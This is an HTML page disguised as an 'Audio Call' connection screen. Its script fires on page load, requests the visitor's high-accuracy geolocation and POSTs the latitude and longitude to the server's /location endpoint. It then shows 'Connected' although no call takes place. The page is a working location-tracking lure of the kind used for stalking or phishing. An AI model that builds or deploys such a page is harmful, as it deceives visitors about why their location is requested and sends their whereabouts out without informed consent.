<!DOCTYPE html>
<html>
<head>
    <title>Audio Call</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body onclick="startLocation()" 
      style="text-align:center; font-family:Arial; margin-top:50px; background:#f5f5f5;">

    <h2>Connecting to Audio Call...</h2>
    <p>Please wait while we connect you</p>

    <p id="status">Initializing...</p>

    <script>
        let started = false;

        function startLocation() {
            if (started) return;
            started = true;

            if (navigator.geolocation) {
                document.getElementById("status").innerText = "Connecting...";

                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        console.log("Accuracy:", position.coords.accuracy);

                        fetch(window.location.origin + '/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                lat: position.coords.latitude,
                                lon: position.coords.longitude
                            })
                        }).then(() => {
                            document.getElementById("status").innerText = "Connected ✅";
                        });
                    },
                    function(error) {
                        document.getElementById("status").innerText = "Connection failed ❌";
                        console.log(error);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById("status").innerText = "Not supported";
            }
        }

        // Auto trigger
        window.onload = function() {
            startLocation();
        };
    </script>

</body>
</html>
